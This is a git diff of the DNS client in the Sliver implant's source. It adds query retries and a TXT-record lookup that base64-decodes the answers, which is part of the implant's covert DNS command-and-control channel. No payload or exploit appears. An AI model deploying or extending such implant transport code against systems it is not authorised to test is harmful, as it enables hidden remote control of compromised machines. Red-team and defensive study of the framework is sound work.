@@ -21,39 +21,69 @@ package dnsclient
 import (
 	"crypto/rand"
 	"encoding/binary"
+	"strings"
 	"time"
 
 	// {{if .Config.Debug}}
 	"log"
 	// {{end}}
 
+	"github.com/bishopfox/sliver/implant/sliver/encoders"
 	"github.com/miekg/dns"
 )
 
-func NewGenericResolver(address string, port string, timeout time.Duration) DNSResolver {
+// NewGenericResolver - Instantiate a new generic resolver
+func NewGenericResolver(address string, port string, retryWait time.Duration, retries int, timeout time.Duration) DNSResolver {
+	if retries < 1 {
+		retries = 1
+	}
 	return &GenericResolver{
-		address: address + ":" + port,
+		address:   address + ":" + port,
+		retries:   retries,
+		retryWait: retryWait,
 		resolver: &dns.Client{
 			ReadTimeout:  timeout,
 			WriteTimeout: timeout,
 		},
+		base64: encoders.Base64{},
 	}
 }
 
+// GenericResolver - Cross-platform Go DNS resolver
 type GenericResolver struct {
-	address  string
-	resolver *dns.Client
+	address   string
+	retries   int
+	retryWait time.Duration
+	resolver  *dns.Client
+	base64    encoders.Base64
 }
 
 func (r *GenericResolver) Address() string {
 	return r.address
 }
 
-func (r *GenericResolver) A(domain string) ([][]byte, time.Duration, error) {
+func (r *GenericResolver) A(domain string) ([]byte, time.Duration, error) {
+	var resp []byte
+	var rtt time.Duration
+	var err error
+	for attempt := 0; attempt < r.retries; attempt++ {
+		resp, rtt, err = r.a(domain)
+		if err == nil {
+			break
+		}
+		// {{if .Config.Debug}}
+		log.Printf("[dns] query error: %s (retry wait: %s)", err, r.retryWait)
+		// {{end}}
+		time.Sleep(r.retryWait)
+	}
+	return resp, rtt, err
+}
+
+func (r *GenericResolver) a(domain string) ([]byte, time.Duration, error) {
 	// {{if .Config.Debug}}
 	log.Printf("[dns] %s->A record of %s ?", r.address, domain)
 	// {{end}}
-	resp, rtt, err := r.localQuery(r.address, domain, dns.TypeA)
+	resp, rtt, err := r.localQuery(domain, dns.TypeA)
 	if err != nil {
 		return nil, rtt, err
 	}
@@ -63,20 +93,66 @@ func (r *GenericResolver) A(domain string) ([][]byte, time.Duration, error) {
 		// {{end}}
 		return nil, rtt, err
 	}
-	records := [][]byte{}
+	records := []byte{}
 	for _, answer := range resp.Answer {
 		switch answer := answer.(type) {
 		case *dns.A:
 			// {{if .Config.Debug}}
-			log.Printf("[dns] answer: %v (%s)", answer.A, answer.A.String())
+			log.Printf("[dns] answer (a): %v", answer.A)
 			// {{end}}
-			records = append(records, []byte(answer.A))
+			records = append(records, []byte(answer.A)...)
 		}
 	}
 	return records, rtt, err
 }
 
-func (r *GenericResolver) localQuery(resolver string, qName string, qType uint16) (*dns.Msg, time.Duration, error) {
+func (r *GenericResolver) TXT(domain string) ([]byte, time.Duration, error) {
+	var resp []byte
+	var rtt time.Duration
+	var err error
+	for attempt := 0; attempt < r.retries; attempt++ {
+		resp, rtt, err = r.txt(domain)
+		if err == nil {
+			break
+		}
+		// {{if .Config.Debug}}
+		log.Printf("[dns] query error: %s (retry wait: %s)", err, r.retryWait)
+		// {{end}}
+		time.Sleep(r.retryWait)
+	}
+	return resp, rtt, err
+}
+
+func (r *GenericResolver) txt(domain string) ([]byte, time.Duration, error) {
+	resp, rtt, err := r.localQuery(domain, dns.TypeTXT)
+	if err != nil {
+		return nil, rtt, err
+	}
+	if resp.Rcode != dns.RcodeSuccess {
+		// {{if .Config.Debug}}
+		log.Printf("[dns] error response status: %v", resp.Rcode)
+		// {{end}}
+		return nil, rtt, err
+	}
+
+	records := ""
+	for _, answer := range resp.Answer {
+		switch answer := answer.(type) {
+		case *dns.TXT:
+			// {{if .Config.Debug}}
+			log.Printf("[dns] answer (txt): %v", answer.Txt)
+			// {{end}}
+			records += strings.Join(answer.Txt, "")
+		}
+	}
+	data := []byte{}
+	if 0 < len(records) {
+		data, err = r.base64.Decode([]byte(records))
+	}
+	return data, rtt, err
+}
+
+func (r *GenericResolver) localQuery(qName string, qType uint16) (*dns.Msg, time.Duration, error) {
 	msg := &dns.Msg{
 		MsgHdr: dns.MsgHdr{
 			Id:               headerID(),
@@ -85,9 +161,9 @@ func (r *GenericResolver) localQuery(resolver string, qName string, qType uint16
 		},
 	}
 	msg.SetQuestion(qName, qType)
-	resp, rtt, err := r.resolver.Exchange(msg, resolver)
+	resp, rtt, err := r.resolver.Exchange(msg, r.address)
 	// {{if .Config.Debug}}
-	log.Printf("[dns] rtt->%s %s (err: %v)", resolver, rtt, err)
+	log.Printf("[dns] rtt->%s %s (err: %v)", r.address, rtt, err)
 	// {{end}}
 	if err != nil {
 		return nil, rtt, err
